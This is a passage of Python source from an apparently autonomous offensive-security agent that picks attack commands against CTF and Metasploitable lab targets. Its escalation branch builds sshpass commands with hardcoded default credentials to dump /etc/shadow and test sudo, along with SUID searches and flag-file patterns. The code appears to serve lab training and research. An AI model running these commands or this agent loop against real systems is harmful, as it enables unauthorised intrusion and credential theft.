                            source="cognition_node",
                            reasoning=(
                                f"CognitionNode fused ({_cog_result.winning_brain}): "
                                f"conf={_cog_result.confidence:.2f}, "
                                f"rnd={_cog_result.rnd_bonus:.2f}"
                            ),
                        )
                        logger.debug(
                            f"[COGNITION][{self.agent_name}] decision: "
                            f"{_cog_template.name} via {_cog_result.winning_brain} "
                            f"conf={_cog_result.confidence:.2f}"
                        )
            except Exception as e:
                logger.debug(f"[COGNITION][{self.agent_name}] Error: {e}")
        
        # Cascade debug — verify web_paths reach the decision point
        _db_wp = discovery_board.get("web_paths", [])
        if _db_wp:
            logger.debug(
                f"[CASCADE][{self.agent_name}] web_paths={_db_wp} "
                f"skill={skill_result is not None}"
            )
        
        # =====================================================================
        # P51: FORCE ALL web probes before DecisionCore arbitration.
        # Web followup probes (homepage → common_paths → path explore →
        # IDOR enum → link extract → download+cred extract) are critical
        # for CTF web apps (e.g., Cap's /data/N IDOR → PCAP → FTP creds).
        # They lose to PPO in DecisionCore weighted scoring (PPO base=1.0
        # vs followup base=0.80 + maturity scaling). Force ALL probes —
        # each fires ONCE per path per engagement, then _web_path_followup
        # returns None and PPO resumes control.
        # =====================================================================
        _web_probe = self._web_path_followup(step_ctx, discovery_board)
        if _web_probe is not None:
            self._step_reasoning_log.append({
                "event": "web_probe_forced",
                "detail": f"Forcing web probe: {getattr(_web_probe, 'template_name', 'unknown')}",
            })
            return _web_probe

        # =====================================================================
        # P55: FORCE playbook result for HTB initial recon (steps 0-2).
        # Playbook produces forced nmap_top_ports → nmap_full_tcp sequence
        # but DecisionCore may still pick PPO over it. For HTB targets in
        # early RECON, playbook MUST win — PPO is untrained and selects
        # narrow wrong-port scans. Same pattern as web_probe force above.
        # =====================================================================
        if (playbook_result is not None
                and playbook_result.source == "playbook"
                and getattr(playbook_result, 'reasoning', '').startswith("[P55 HTB")):
            self._step_reasoning_log.append({
                "event": "htb_recon_forced",
                "detail": f"Forcing HTB recon: {getattr(playbook_result, 'template_name', 'unknown')}",
            })
            return playbook_result

        # =====================================================================
        # P1: Decision Sovereignty — DecisionCore.arbitrate()
        # All source producers above have run. Collect as Advisory objects
        # and let DecisionCore pick the single winner via weighted scoring.
        # Replaces: 12-level cascade, ActionArbitrator, coin flip,
        #           mentor-first/PPO-first paths, codex stagnation override.
        # =====================================================================
        result = self._p1_arbitrate_decision(
            step_ctx=step_ctx,
            proposed_action=proposed_action,
            confidence=confidence,
            skill_result=skill_result,
            playbook_result=playbook_result,
            micro_chain_result=micro_chain_result,
            phase_guided_result=phase_guided_result,
            codex_meta_result=codex_meta_result,
            cognition_decision=cognition_decision,
            filtered_commands=filtered_commands,
            discovery_board=discovery_board,
            gpt_available=gpt_available,
            should_call_gpt=should_call_gpt,
            mentor_engagement=mentor_engagement,
            gpt_reason=gpt_reason,
        )

        # =========================================================================
        # PHASE 17: NULL SAFETY — guarantee `result` is never None past this point.
        # If the entire decision cascade failed to produce a result, fall back to
        # registry (guaranteed to return a valid SmartDecisionResult).
        # =========================================================================
        if result is None:
            logger.warning(f"[{self.agent_name}] Decision cascade returned None — registry fallback")
            result = self._decide_from_registry(step_ctx, proposed_action, confidence)

        # =========================================================================
        # FINAL SAFETY: Check role exclusivity BEFORE anti-repeat
        # =========================================================================
        is_valid_role = self._validate_command_for_role(result.command)

        # =========================================================================
        # PHASE 27: Evidence Gate — validate exploit commands have evidence
        # =========================================================================
        _eg_result_str = ""
        _eg_reasons: list = []
        try:
            from core.feature_flags import get_feature_flags as _get_ff_eg
            _eg_mode = _get_ff_eg().strict_exploit_gate
            if _eg_mode != "off":
                _eg_valid, _eg_reasons = self._validate_exploit_evidence(
                    result, discovery_board, current_phase
                )
                self._evidence_gate_total += 1
                if not _eg_valid:
                    self._evidence_gate_rejects += 1
                    if _eg_mode == "enforce":
                        _eg_result_str = "enforce_reject"
                        logger.info(
                            f"[EV-GATE][{self.agent_name}] ENFORCE reject: "
                            f"{result.command[:60]} reasons={_eg_reasons}"
                        )
                        result = self._decide_from_registry(step_ctx, proposed_action, confidence)
                        result.reasoning = f"evidence_gate_enforce: {_eg_reasons}"
                    else:  # "log"
                        _eg_result_str = "log_reject"
                        logger.debug(
                            f"[EV-GATE][{self.agent_name}] LOG reject (not blocked): "
                            f"{result.command[:60]} reasons={_eg_reasons}"
                        )
                else:
                    _eg_result_str = "pass" if _eg_reasons == [] else "pass_with_notes"
        except Exception as e:
            logger.debug(f"[EV-GATE] Error: {e}")
        result.evidence_gate_result = _eg_result_str
        result.evidence_gate_reasons = _eg_reasons
        self._trace_stage("source", result.source or "unknown", result.confidence, True)
        self._trace_stage("evidence_gate", _eg_result_str, 1.0 if _eg_result_str == "pass" else 0.0, _eg_result_str != "enforce_reject")

        # Pre-compute ppo_bypass flag — needed by TacticalCortex and anti-repeat
        ppo_bypass = (result.source in ("ppo", "privesc_escalation", "codex_meta", "cognition_node") and is_valid_role)
        
        # =========================================================================
        # PHASE 9.4: TACTICAL CORTEX QUALITY GATE
        # Evaluates the proposed command against 7 rule categories:
        #   PRECONDITION, SEQUENCING, CONTRADICTION, AGENT_MISMATCH,
        #   RISK, STAGNATION, OPPORTUNITY
        # Verdicts: APPROVE → proceed, REDIRECT → use alternative,
        #           BLOCK → hard replace, ESCALATE → LLM consult
        # PPO-bypass decisions are assessed but only warnings are attached
        # (not overridden), so PPO retains learning ownership.
        # =========================================================================
        _tactical_assessment = None
        if self.tactical_cortex is not None:
            # Phase 9.7: Feature-flag guard for TC gate
            _tc_enabled = True
            try:
                from core.feature_flags import get_feature_flags
                _tc_enabled = get_feature_flags().tactical_cortex_gate
            except Exception:
                pass
            if not _tc_enabled:
                logger.debug(f"[{self.agent_name}] TacticalCortex gate OFF (FF)")
            else:
                try:
                    _tc_template = COMMAND_REGISTRY.get(result.template_name) if result.template_name else None
                    _tc_phase_name = (
                        current_phase.name if hasattr(current_phase, 'name')
                        else str(current_phase)
                    )
                    _tc_detection = ctx.state_flags.get("detection_risk", 0.0)
                    _tc_board = {}
                    if hasattr(self, '_last_discovery_board'):
                        _tc_board = self._last_discovery_board or {}

                    # Inject target IP into state so TC can build correct alternatives
                    _tc_state: Dict[str, Any] = dict(ctx.state_flags) if ctx.state_flags else {}
                    if ctx.target:
                        _tc_state["target"] = ctx.target
                    # Build flags_set for TacticalCortex precondition check
                    # TC expects state["flags_set"] as a set of flag names
                    if "flags_set" not in _tc_state:
                        _tc_state["flags_set"] = {
                            k for k, v in (ctx.state_flags or {}).items()
                            if v is True or v == 1
                        }
                    
                    _tactical_assessment = self.tactical_cortex.assess(
                        command=result.command or "",
                        template=_tc_template,
                        state=_tc_state,
                        agent_role=self.agent_role.get("role", "red"),
                        discovery_board=_tc_board,
                        current_phase=_tc_phase_name,
                        detection_risk=float(_tc_detection),
                        step=step_ctx.step,
                    )

                    if _tactical_assessment and not _tactical_assessment.approved:
                        # Playbook and PPO decisions: attach warning but don't override
                        # Playbook is a carefully designed curriculum chain — TC shouldn't
                        # redirect it (breaks dependency tracking with wrong template_name)
                        _tc_bypass = ppo_bypass or result.source == "playbook"
                        if _tc_bypass:
                            # PPO/Playbook/CognitionNode decisions: warn but don't override
                            result.mentor_reasoning = (
                                f"[TACTICAL-WARN:{_tactical_assessment.verdict.name}] "
                                f"{_tactical_assessment.reasoning[:150]} | "
                                f"{result.mentor_reasoning or ''}"
                            )
                            logger.debug(
                                f"[{self.agent_name}] TacticalCortex warning "
                                f"({result.source}-bypass): "
                                f"{_tactical_assessment.verdict.name} — "
                                f"{_tactical_assessment.reasoning[:100]}"
                            )
                        else:
                            # Non-PPO decisions: respect BLOCK/REDIRECT verdicts
                            if _tactical_assessment.alternative:
                                logger.info(
                                    f"[{self.agent_name}] TacticalCortex "
                                    f"{_tactical_assessment.verdict.name}: "
                                    f"'{result.template_name}' → "
                                    f"'{_tactical_assessment.alternative_template}'"
                                )
                                # Phase 10.3: Log reasoning for dashboard
                                self._step_reasoning_log.append({
                                    "type": "tc_block",
                                    "agent": self.agent_name,
                                    "message": (
                                        f"'{result.template_name}' → "
                                        f"'{_tactical_assessment.alternative_template}'"
                                    ),
                                })
                                # Store negative PPO trajectory for the blocked command
                                if self._ppo_pending is not None:
                                    self._store_ppo_negative_reward(
                                        -3.0, f"tactical_{_tactical_assessment.verdict.name.lower()}"
                                    )
                                result.command = _tactical_assessment.alternative
                                result.template_name = _tactical_assessment.alternative_template or result.template_name
                                result.source = "tactical_cortex"
                                result.confidence = _tactical_assessment.confidence
                                result.mentor_reasoning = (
                                    f"[TACTICAL:{_tactical_assessment.verdict.name}] "
                                    f"{_tactical_assessment.reasoning[:200]}"
                                )
                            else:
                                # No alternative available — attach warning only
                                result.mentor_reasoning = (
                                    f"[TACTICAL-{_tactical_assessment.verdict.name}] "
                                    f"{_tactical_assessment.reasoning[:150]} | "
                                    f"{result.mentor_reasoning or ''}"
                                )
                    elif _tactical_assessment and _tactical_assessment.approved:
                        logger.debug(
                            f"[{self.agent_name}] TacticalCortex APPROVED: "
                            f"'{result.template_name}' (conf={_tactical_assessment.confidence:.2f})"
                        )
                except Exception as e:
                    logger.warning(f"[{self.agent_name}] TacticalCortex assess error: {e}")

        # Phase 40: Trace tactical cortex result
        if _tactical_assessment is not None:
            _tc_verdict = getattr(_tactical_assessment, 'verdict', None)
            _tc_vname = _tc_verdict.name if _tc_verdict and hasattr(_tc_verdict, 'name') else 'unknown'
            _tc_conf = getattr(_tactical_assessment, 'confidence', 0.5)
            self._trace_stage('tactical_cortex', _tc_vname, _tc_conf, getattr(_tactical_assessment, 'approved', True))

        # =========================================================================
        # R52: UNIFIED PHASE-STUCK ESCALATION SHORTCUT (replaces R49/R50/R51)
        # When the offensive agent is stuck in PRIV_ESC or LATERAL_MOVEMENT
        # without root_shell_obtained, force a targeted sshpass root attempt.
        #
        # PRIV_ESC: fires at step 3 and every 3 steps after (3, 6, 9, ...)
        #   - Lowered from 10→3 because R51 showed PRIV_ESC only lasts ~2 steps
        #     so the old threshold NEVER fired. Now fires on 3rd step.
        #
        # LATERAL_MOVEMENT: fires at step 5 and every 5 steps after (5, 10, 15, ...)
        #   - R51 showed agents grind 10-15 steps in LATERAL waiting for
        #     domain_admin_obtained (only from enum4linux). Root shell would
        #     cascade: root → POST_EXPLOITATION → CLOSEOUT (if exfil/persist exist).
        #
        # Pre-cleanup: kill stale SSH connections before sshpass attempt.
        # SSH failure threshold: max 3 failures per episode.
        # =========================================================================
        _privesc_steps = getattr(self, '_privesc_steps', 0)
        _lateral_steps = getattr(self, '_lateral_steps', 0)
        _should_escalate = False
        _escalation_source_phase = ""
        _escalation_step_count = 0

        if (self.agent_role.get("role") == "offensive"
                and not ctx.state_flags.get("root_shell_obtained")
                and getattr(self, '_ssh_failures_this_episode', 0) < 3):
            if (current_phase == AttackPhase.PRIVILEGE_ESCALATION
                    and _privesc_steps >= 5
                    and _privesc_steps % 5 == 0):  # R56: 3→5. Less aggressive in PRIV_ESC (duration gate keeps agent exploring)
                _should_escalate = True
                _escalation_source_phase = "PRIV_ESC"
                _escalation_step_count = _privesc_steps
            elif (current_phase == AttackPhase.LATERAL_MOVEMENT
                    and _lateral_steps >= 5
                    and _lateral_steps % 5 == 0
                    and ctx.state_flags.get("shell_obtained")):
                _should_escalate = True
                _escalation_source_phase = "LATERAL"
                _escalation_step_count = _lateral_steps

        if _should_escalate:
            target = ctx.target
            # R53: Alternate between sshpass root attempt and /etc/shadow dump.
            # R52 showed sshpass fails consistently on MS2 (Permission denied / 
            # connection issues) — agents stuck 40 steps with only sshpass.
            # Even-numbered fires → cat /etc/shadow (produces hash_known via parser)
            # Odd-numbered fires → sshpass root attempt (produces root_shell if works)
            _escalation_attempt = getattr(self, '_escalation_attempt_count', 0)
            self._escalation_attempt_count = _escalation_attempt + 1
            
            # Phase 42: Only use msfadmin creds for Metasploitable targets.
            # For generic/HTB targets, use discovered credentials or generic privesc.
            _is_ms_target = target in ("172.28.0.10", "172.28.0.11") or "172.28.0" in target
            _disc_creds = getattr(ctx, 'credentials', None) or set()
            _esc_user, _esc_pass = "", ""
            if _is_ms_target:
                _esc_user, _esc_pass = "msfadmin", "msfadmin"
            elif isinstance(_disc_creds, (set, list)):
                for _c in _disc_creds:
                    if isinstance(_c, str) and ":" in _c:
                        _esc_user, _esc_pass = _c.split(":", 1)
                        break
            
            if _esc_user and _esc_pass:
                if _escalation_attempt % 2 == 0:
                    # Even: cat /etc/shadow → produces hash_dump discovery → hash_known flag
                    escalation_cmd = (
                        f"sshpass -p {_esc_pass} ssh -o StrictHostKeyChecking=no "
                        f"-o HostKeyAlgorithms=+ssh-rsa {_esc_user}@{target} "
                        f"'cat /etc/shadow 2>/dev/null'"
                    )
                    _esc_type = "shadow_dump"
                else:
                    # Odd: sshpass root attempt → produces root_shell if sudo works
                    escalation_cmd = (
                        f"pkill -f 'ssh.*{target}' 2>/dev/null; sleep 0.5; "
                        f"sshpass -p {_esc_pass} ssh -o StrictHostKeyChecking=no "
                        f"-o HostKeyAlgorithms=+ssh-rsa {_esc_user}@{target} "
                        f"'echo {_esc_pass} | sudo -S id'"
                    )
                    _esc_type = "sshpass_root"
            else:
                # No credentials available — try generic privesc
                if _escalation_attempt % 2 == 0:
                    escalation_cmd = f"find / -perm -4000 -type f 2>/dev/null | head -20"
                    _esc_type = "suid_search"
                else:
                    escalation_cmd = f"sudo -l 2>/dev/null"
                    _esc_type = "sudo_check"
            
            result.command = escalation_cmd
            result.source = "privesc_escalation"
            result.confidence = 0.6
            result.mentor_reasoning = (
                f"[PHASE-ESCALATION] Forced {_esc_type} after "
                f"{_escalation_step_count} steps in {_escalation_source_phase}"
            )
            logger.info(
                f"[{self.agent_name}] [PHASE-ESCALATION] Forced {_esc_type} "
                f"at {_escalation_source_phase} step {_escalation_step_count}"
            )
            # Store negative PPO trajectory if this overrides a PPO decision
            if self._ppo_pending is not None:
                try:
                    if self.ppo_agent is not None:
                        self.ppo_agent.store_transition(
                            self._ppo_pending['state'],
                            self._ppo_pending['action'],
                            self._ppo_pending['log_prob'],
                            -3.0,  # Negative reward: PPO failed to escalate
                            self._ppo_pending['value'],
                            False,
                        )
                        self._ppo_pending = None
                except Exception:
                    self._ppo_pending = None

        # =========================================================================
        # PHASE 6: PPO decisions BYPASS post-selection anti-repeat guard.
        # PPO already has comprehensive pre-selection masking in _decide_ppo():
        #   1. Filtered to role-valid commands only
        #   2. Precondition mask from get_action_mask_with_counts(max_repeats=1)
        #   3. Prefix count blocking (≥3 same prefix)
        # If PPO selected it through all those masks, TRUST IT. The old system
        # overrode ~58.8% of PPO decisions via post-selection anti-repeat,
        # destroying credit assignment. PPO must own its decisions to learn.
        #
        # Non-PPO decisions (playbook, registry, mentor, skill) still go through
        # the anti-repeat guard as before.
        # =========================================================================
        ppo_bypass = (result.source in ("ppo", "privesc_escalation", "codex_meta", "cognition_node") and is_valid_role)
        
        # =========================================================================
        # PHASE 6.1: FAMILY-BASED ANTI-REPEAT WITH GRADED PENALTIES
        # 
        # Instead of hard-blocking any repeated command, we now:
        # 1. Classify commands into ACTION FAMILIES
        # 2. Track per-family usage counts
        # 3. Apply graded penalties: 1st repeat → small, 2nd → larger, 3rd → replace
        # 4. Role violations still get hard-replaced
        #
        # PPO decisions are still exempt (they have pre-selection masking).
        #
        # P50 FIX: Stagnation-aware thresholds + flag capture whitelist.
        # When stagnation > 15, thresholds are raised to give the system more
        # chances to retry productive commands instead of cycling through
        # random alternatives that waste budget.
        # =========================================================================
        all_cmds = ctx.command_history if ctx.command_history else []
        result_prefix = self._extract_tool_prefix(result.command) if result.command else ""
        result_cmd_norm = result.command.strip() if result.command else ""
        
        # Count in ENTIRE episode history
        exact_repeat_count = sum(1 for c in all_cmds if c.strip() == result_cmd_norm)
        prefix_repeat_count = sum(1 for c in all_cmds 
                                   if self._extract_tool_prefix(c) == result_prefix)
        
        # ── P50: Stagnation-aware threshold scaling ──────────────────
        # When the system is stuck for 15+ steps without discoveries, raise
        # repeat thresholds. This prevents the anti-repeat from blocking
        # potentially productive commands while the system is struggling.
        _stag = getattr(self, '_stagnation_steps', 0)
        _exact_threshold = 3    # Default: hard replace on 3rd exact repeat
        _prefix_threshold = 5   # Default: hard replace on 5th prefix repeat
        _family_threshold = 8   # Default: hard replace on 8th family repeat
        if _stag >= 25:
            _exact_threshold = 8
            _prefix_threshold = 12
            _family_threshold = 16
        elif _stag >= 15:
            _exact_threshold = 6
            _prefix_threshold = 8
            _family_threshold = 12
        
        # ── P50: Flag capture whitelist ──────────────────────────────
        # In late phases (POST_EXPLOITATION+), flag-reading commands MUST
        # not be blocked by anti-repeat. These are the GOAL commands.
        _flag_capture_bypass = False
        if result_cmd_norm:
            _late_phases = {
                AttackPhase.POST_EXPLOITATION, AttackPhase.EXFILTRATION,
                AttackPhase.CLOSEOUT, AttackPhase.PRIVILEGE_ESCALATION,
                AttackPhase.LATERAL_MOVEMENT,
            }
            _is_late_phase = current_phase in _late_phases
            _FLAG_PATTERNS = (
                "cat /root/root.txt", "cat /root/flag", "cat /home/",
                "user.txt", "root.txt", "proof.txt", "flag.txt",
                "type C:\\Users\\", "type C:\\flag",
            )
            _is_flag_cmd = any(p in result_cmd_norm for p in _FLAG_PATTERNS)
            if _is_flag_cmd and _is_late_phase:
                _flag_capture_bypass = True
                logger.info(
                    f"[{self.agent_name}] FLAG-CAPTURE-BYPASS: Allowing "
                    f"'{result_cmd_norm[:60]}' despite repeat count "
                    f"{exact_repeat_count} (phase={current_phase.name})"
                )
        
        # R42: PPO bypass should NOT apply to heavy prefix repeats.
        # In R41, Orion PPO looped ldapsearch 4+ times because PPO was fully exempt.
        # Phase 38: Use template_name for family classification instead of prefix-only.
        # This prevents false-positive blocks on semantically distinct commands
        # that share a tool prefix (e.g., nmap_service_version vs nmap_udp_scan).
        # R50: privesc_escalation is a forced emergency override — NEVER revoke its bypass.
        _result_template = getattr(result, 'template_name', '') or ''
        _template_repeat_count = sum(
            1 for c in all_cmds
            if getattr(c, 'template_name', self._extract_tool_prefix(c if isinstance(c, str) else '')) == _result_template
        ) if _result_template else prefix_repeat_count
        if ppo_bypass and result.source == "ppo" and _template_repeat_count >= 3:
            ppo_bypass = False
            logger.info(
                f"[{self.agent_name}] PPO bypass revoked: "
                f"template '{_result_template or result_prefix}' used {_template_repeat_count}x in episode"
            )
        
        # Determine action family for this command
        family = self._get_action_family(result_prefix)
        family_count = sum(
            1 for c in all_cmds
            if self._get_action_family(self._extract_tool_prefix(c)) == family
        )
        
        # Graded penalty tracking (stored on result for reward calculator)
        repeat_penalty = 0.0
        
        if not ppo_bypass and not _flag_capture_bypass:
            # Role violation → hard replace (always)
            if not is_valid_role:
                result = self._replace_with_alternative(result, step_ctx, ctx, all_cmds, "role_violation")
            # Exact repeat → hard replace (threshold+ time) or penalty (1st-2nd)
            elif exact_repeat_count >= _exact_threshold:
                result = self._replace_with_alternative(result, step_ctx, ctx, all_cmds, 
                    f"exact_repeat_x{exact_repeat_count}")
            elif exact_repeat_count >= 1:
                # Graded: penalize but allow
                repeat_penalty = -2.0 * exact_repeat_count
                result.mentor_reasoning = (
                    f"[REPEAT-PENALTY:{repeat_penalty:.1f}] "
                    f"{result.mentor_reasoning or ''}"
                )
            # Family cooldown: if same family used >threshold times, replace
            elif family_count >= _family_threshold:
                result = self._replace_with_alternative(result, step_ctx, ctx, all_cmds,
                    f"family_cooldown({family}={family_count})")
            # Prefix repeat → penalize but allow up to threshold, then replace
            elif prefix_repeat_count >= _prefix_threshold:
                result = self._replace_with_alternative(result, step_ctx, ctx, all_cmds,
                    f"prefix_repeat_x{prefix_repeat_count}")
            elif prefix_repeat_count >= 2:
                repeat_penalty = -1.0 * (prefix_repeat_count - 1)
                result.mentor_reasoning = (
                    f"[PREFIX-PENALTY:{repeat_penalty:.1f}] "
                    f"{result.mentor_reasoning or ''}"
                )
        
        # Store repeat penalty for reward calculation
        result._repeat_penalty = repeat_penalty

        # =========================================================================
        # PHASE 11.0: Record budget outcome AFTER anti-repeat guard
        # Recording here ensures we count the FINAL command, not a pre-replacement
        # mentor result that was overridden by anti-repeat or TacticalCortex.
        # =========================================================================
        if self.budget_controller is not None:
            if getattr(result, 'mentor_call', False):
                _tokens = getattr(result, 'tokens_used', 0)
                self.budget_controller.record_mentor_call(tokens_used=_tokens)
            else:
                self.budget_controller.record_no_call()

        # =====================================================================
        # Phase 9.5: PPO REWARD ATTRIBUTION FIX
        # If a PPO-sourced command was replaced by anti-repeat, the original
        # PPO trajectory must be finalized with a penalty (-3.0) and cleared.
        # Otherwise the replacement command's reward gets misattributed to the
        # original PPO log_prob, teaching PPO the wrong signal.
        # Controlled by FF_PPO_REWARD_ATTRIBUTION_FIX.
        # =====================================================================
        if (result.source not in ("ppo", "cognition_node")
                and self._ppo_pending is not None
                and not ppo_bypass):
            try:
                from core.feature_flags import get_feature_flags
                if get_feature_flags().ppo_reward_attribution_fix:
                    if self.ppo_agent is not None:
                        try:
                            # Phase 38 X1: Differentiated override penalties
                            # instead of flat -3.0 for all overrides
                            _override_penalties = {
                                "anti_repeat": -1.0,       # Soft: PPO wasn't wrong, just redundant
                                "registry": -1.5,          # Registry found better match
                                "mentor": -2.0,            # Mentor override — moderate
                                "dual_mentor": -2.0,
                                "micro_chain": -2.0,
                                "phase_guided": -2.0,
                                "playbook": -2.5,          # Curriculum-guided override
                                "fallback": -3.0,          # PPO produced garbage
                            }
                            _override_reason = result.source or "unknown"
                            # Evidence gate enforce gets its own penalty
                            if getattr(result, 'evidence_gate_result', '') == "enforce_reject":
                                _penalty = -2.0
                                _override_reason = "evidence_gate"
                            else:
                                _penalty = _override_penalties.get(_override_reason, -3.0)
                            
                            self.ppo_agent.store_transition(
                                state=self._ppo_pending["state"],
                                action=self._ppo_pending["action"],
                                log_prob=self._ppo_pending["log_prob"],
                                reward=_penalty,
                                value=self._ppo_pending["value"],
                                done=False,
                            )
                            logger.debug(
                                f"[PPO-ATTRIB-FIX][{self.agent_name}] Stored {_penalty:.1f} penalty "
                                f"for override by {_override_reason}, clearing _ppo_pending"
                            )
                        except Exception:
                            pass
                    self._ppo_pending = None
            except ImportError:
                pass

        # =====================================================================
        # PHASE 7.1: SMART REASONING CHECK (codex-mini)
        # If the selected command belongs to a BEHIND phase or seems stuck,
        # ask codex-mini for quick reasoning guidance. Token-efficient: max 150 tokens.
        # Only triggers when: (1) agent is stagnating, OR (2) command seems wrong phase.
        # R60: codex_meta source ALWAYS skips reasoning check — it IS the highest
        # reasoning layer. Also track gate overrides for storm trigger.
        # =====================================================================
        _stag = getattr(self, '_stagnation_steps', 0)
        _cmd_phase_order = 0
        _cur_phase_order = self.PHASE_ORDER.get(current_phase, 0)
        cmd_template = None
        
        if result.template_name:
            # Look up the command's phase
            cmd_template = COMMAND_REGISTRY.get(result.template_name)
            if cmd_template:
                _cmd_phase_order = self.PHASE_ORDER.get(cmd_template.phase, 0)
        
        _needs_reasoning = False
        _reasoning_question = ""

        # R60: Codex Meta is the top reasoning layer — never second-guess it
        # web_followup has its own phase-aware progression — don't override it
        _skip_reasoning = (result.source in ("codex_meta", "web_followup"))
        
        # Case 1: Command is from a phase 2+ steps behind current
        if _skip_reasoning:
            pass  # R60: Codex output is trusted, skip all reasoning gates
        elif _cmd_phase_order < _cur_phase_order - 1 and not ppo_bypass:
            _needs_reasoning = True
            _reasoning_question = (
                f"I'm in {current_phase.name} but about to run a "
                f"{cmd_template.phase.name if cmd_template else 'unknown'}-phase command "
                f"({result.template_name}). Should I do something more phase-appropriate instead? "
                f"What command would advance me forward?"
            )
        
        # Case 2: Stagnating for 4+ steps — ask what to do differently
        elif _stag >= 4 and not ppo_bypass and gpt_available:
            _needs_reasoning = True
            _reasoning_question = (
                f"I've been in {current_phase.name} for {_stag} steps without new discoveries. "
                f"What should I try to break through to the next phase?"
            )
        
        # Case 3: Credentials found but still running credential-search commands
        if (ctx.state_flags.get("credentials_known") and result.template_name and
                any(kw in (result.template_name or "").lower() 
                    for kw in ["brute", "hydra", "crack", "pass"]) and not ppo_bypass):
            _needs_reasoning = True
            _reasoning_question = (
                f"I already have credentials. Why am I running {result.template_name}? "
                f"Should I use the known creds to exploit a service instead?"
            )
        
        # Case 4: Shell obtained but still running exploit commands
        if (ctx.state_flags.get("shell_obtained") and result.template_name and
                _cmd_phase_order <= self.PHASE_ORDER.get(AttackPhase.EXPLOITATION, 2) and
                _cur_phase_order > self.PHASE_ORDER.get(AttackPhase.EXPLOITATION, 2) and
                not ppo_bypass):
            _needs_reasoning = True
            _reasoning_question = (
                f"I already have a shell but I'm about to run {result.template_name} "
                f"(exploitation-level). Should I focus on post-exploitation or privesc instead?"
            )
        
        if _needs_reasoning and gpt_available and self._step_llm_calls < _MAX_LLM_CALLS_PER_STEP:
            mentor_advice = self._ask_mentor_reasoning(step_ctx, _reasoning_question)
            if mentor_advice:
                self._step_llm_calls += 1  # Phase 38 X3: Track LLM call
                # Inject reasoning into the result
                result.mentor_reasoning = (
                    f"[REASONING-CHECK] {mentor_advice[:200]} | "
                    f"{result.mentor_reasoning or ''}"
                )
                # If mentor suggests a specific command and we're not PPO-bypassed,
                # check if we should replace. Only replace for very backward commands.
                if _cmd_phase_order < _cur_phase_order - 1 and not ppo_bypass:
                    # Try to find a phase-appropriate command instead
                    phase_cmds = [
                        c for c in filtered_commands
                        if self.PHASE_ORDER.get(c.phase, 0) >= _cur_phase_order
                    ]
                    if phase_cmds:
                        alt_template = random.choice(phase_cmds)
                        params = {"target": ctx.target}
                        for param in alt_template.required_params:
                            if param not in params:
                                params[param] = self._get_default_param(param, ctx)
                        rendered = render_command(alt_template, params)
                        result.command = rendered
                        result.template_name = alt_template.name
                        result.params = params
                        result.source = "phase_gate_reasoning"
                        result.confidence = 0.65
                        logger.info(
                            f"[PHASE-GATE] {self.agent_name}: Replaced backward command "
                            f"with {alt_template.name} (phase={alt_template.phase.name})"
                        )
                        # Phase 10.3: Log reasoning for dashboard
                        self._step_reasoning_log.append({
                            "type": "phase_gate",
                            "agent": self.agent_name,
                            "message": (
                                f"Backward cmd → {alt_template.name} "
                                f"(phase={alt_template.phase.name})"
                            ),
                        })
                        # R60: Track gate overrides for codex meta storm trigger
                        self._codex_meta_gate_overrides = getattr(
                            self, '_codex_meta_gate_overrides', 0
                        ) + 1
                        # Phase 7.2: Teach PPO that backward commands are bad
                        # Store negative reward so PPO learns not to propose them
                        if self._ppo_pending is not None:
                            self._store_ppo_negative_reward(-5.0, "backward_phase_command")

        # ─── P36: STRUCTURED DECISION REASONING — NEVER EMPTY ─────────
        # Build structured reasoning with EVIDENCE, GOAL, WHY_THIS, CONF.
        # If reasoning is missing/whitespace/<20 chars, generate from pipeline state.
        # This is always populated — the dashboard MUST show useful context.
        # ─────────────────────────────────────────────────────────────────
        _p36_evidence_parts = []
        _p36_db = discovery_board if isinstance(discovery_board, dict) else {}
        _p36_ports = _p36_db.get("ports", [])
        _p36_services = _p36_db.get("services", [])
        _p36_creds = _p36_db.get("credentials", [])
        _p36_shells = _p36_db.get("shells", [])
        _p36_vulns = _p36_db.get("vulns", [])
        if _p36_ports:
            _p36_evidence_parts.append(f"ports=[{','.join(str(p) for p in list(_p36_ports)[:6])}]")
        if _p36_services:
            _p36_evidence_parts.append(f"services=[{','.join(str(s) for s in list(_p36_services)[:4])}]")
        if _p36_creds:
            _p36_evidence_parts.append(f"creds={len(list(_p36_creds))}")
        if _p36_shells:
            _p36_evidence_parts.append(f"shells={len(list(_p36_shells))}")
        if _p36_vulns:
            _p36_evidence_parts.append(f"vulns=[{','.join(str(v) for v in list(_p36_vulns)[:3])}]")
        if not _p36_evidence_parts:
            _p36_evidence_parts.append("none_yet")
        _p36_evidence = ", ".join(_p36_evidence_parts)

        _p36_phase_name = current_phase.name if hasattr(current_phase, 'name') else str(current_phase)
        _p36_goal = f"Advance {_p36_phase_name} phase"
        if _p36_phase_name == "RECON":
            _p36_goal = "Discover open ports and services on target"
        elif _p36_phase_name == "ENUMERATION":
            _p36_goal = "Enumerate services for vulns and entry points"
        elif _p36_phase_name == "EXPLOITATION":
            _p36_goal = "Exploit identified vulnerabilities to gain access"
        elif _p36_phase_name == "PRIVILEGE_ESCALATION":
            _p36_goal = "Escalate from user shell to root"
        elif _p36_phase_name == "EXFILTRATION":
            _p36_goal = "Extract flags and sensitive data"

        _p36_why = f"{result.source}: "
        if result.mentor_reasoning:
            _p36_why += result.mentor_reasoning[:120]
        elif result.template_name:
            _p36_why += f"template={result.template_name}"
        else:
            _p36_cmd_short = (result.command or "")[:60]
            _p36_why += f"cmd={_p36_cmd_short}"

        _p36_conf = f"{result.confidence:.2f}"

        _p36_stop = "phase_advance or discovery" if _p36_phase_name in ("RECON", "ENUMERATION") else "flag_capture or root_shell"

        result.reasoning = (
            f"EVIDENCE: {_p36_evidence} | "
            f"GOAL: {_p36_goal} | "
            f"WHY_THIS: {_p36_why} | "
            f"STOP: {_p36_stop} | "
            f"CONF: {_p36_conf}"
        )

        # P36: Validation — if reasoning somehow ended up < 20 chars, force a meaningful fallback
        if len(result.reasoning.strip()) < 20:
            result.reasoning = (
                f"EVIDENCE: {_p36_evidence} | "
                f"GOAL: {_p36_goal} | "
                f"WHY_THIS: {result.source} fallback — no detailed reasoning available | "
                f"STOP: {_p36_stop} | "
                f"CONF: {_p36_conf}"
            )

        # P36: Append to step reasoning log for dashboard rendering
        self._step_reasoning_log.append({
            "type": "decision",
            "agent": self.agent_name,
            "message": result.reasoning,
        })

        result.belief_snapshot = {
            "phase": current_phase.name if hasattr(current_phase, 'name') else str(current_phase),
            "confidence": confidence,
            "discoveries": len(ctx.state_flags) if ctx.state_flags else 0,
            "cmd_history_len": len(all_cmds),
